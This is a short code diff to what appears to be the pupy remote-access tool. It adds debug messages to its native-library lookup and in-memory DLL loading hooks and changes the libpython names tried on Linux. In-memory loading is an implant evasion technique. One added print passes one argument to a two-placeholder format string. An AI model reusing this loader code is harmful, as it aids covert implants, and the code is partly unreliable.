@@ -27,12 +27,14 @@ NATIVE_LIB_PATTERNS = [
 
 
 def _find_library(name):
+    pupy.dprint('_find_library called: {} => {}', name)
     for pattern in NATIVE_LIB_PATTERNS:
         libname = pattern.format(name)
         try:
             return ctypes.CDLL(libname)
         except:
             pass
+    pupy.dprint('library {} not found ...', name)
 
 
 def _pupy_make_library_path(name):
@@ -73,6 +75,8 @@ def _pupy_dlopen(name, *args, **kwargs):
 
     handle = pupy.load_dll(name)
     if handle:
+        pupy.dprint(
+            'ctypes dlopen / pupyized : {} found in-memory handle', name)
         return handle
     else:
         pupy.dprint('load_dll by name ({}) failed', name)
@@ -105,7 +109,7 @@ def apply_dl_hacks():
         except WindowsError:
             pupy.dprint('python310.dll not found')
     else:
-        for libname in (None, 'libpython3.10.so.1.0', 'libpython3.10.so'):
+        for libname in (None, 'python310.so'):
             try:
                 candidate = ctypes.PyDLL(libname)
             except OSError:
